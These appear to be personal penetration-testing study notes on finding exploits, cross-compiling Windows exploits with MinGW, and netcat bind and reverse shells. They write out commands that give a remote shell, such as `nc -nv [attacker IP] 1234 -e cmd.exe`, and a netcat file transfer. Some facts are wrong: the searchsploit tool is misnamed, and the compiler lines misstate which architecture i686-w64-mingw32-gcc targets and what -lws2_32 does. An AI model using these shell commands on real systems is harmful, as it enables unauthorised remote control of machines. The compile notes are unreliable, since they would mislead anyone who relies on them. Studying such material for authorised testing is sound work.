# Searching for Exploit
- https://www.exploit-db.com/
- https://www.rapid7.com/db/
- https://packetstormsecurity.com/
- `searchexploit -u` -- to update the repository
- `searchexploit -m [ID of exploit]` -- to copy the exploit to current working dir

# Cross-Compiling Exploits
- Mingw-w64 -- for compiling win exploit in linux
	- `sudo apt-get install mingw-w64`
- `sudo apt-get install gcc`  -- for compiling c/c++ exploit
- windows exploit written in C; compile in linux
	- `i686-w64-mingw32-gcc exploit.c -o exploit` -- it will compile exe for 64 bit
	- `i686-w64-mingw32-gcc exploit.c -o exploit -lws2_32` -- it will compile exe for 32 bit

# Bind & Reverse Shells
######  Netcat
- `nc -nv IP PORT` -- for verbosity and no dns resolution
- to send file via nc
	- `nc -nlvp 1234 > test.txt` this on target machine to listen for connection
	- `nc -nv Ip 1234 < test.txt` this on attacker machine to connect and send file
###### Bind Shells
- A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system
- ![[bind shell.png]]
- `nc -nlvp 1234 -e cmd.exe` -- on target to listen and when someone connect execute cmd.exe
	- use `-c /bin/bash` if target is linux
- `nc -nv [target IP] 1234` -- on attacker
###### Reverse Shells
- A reverse shell is a type of remote shell where the target connects directly to a listener on the attackerâ€™s system, consequently allowing for execution of commands on the target system.
- ![[images/reverse shell.png]]
- `nc -nlvp 1234` -- on attacker to listen
- `nc -nv [attacker IP] 1234 -e cmd.exe` -- on target to make connection
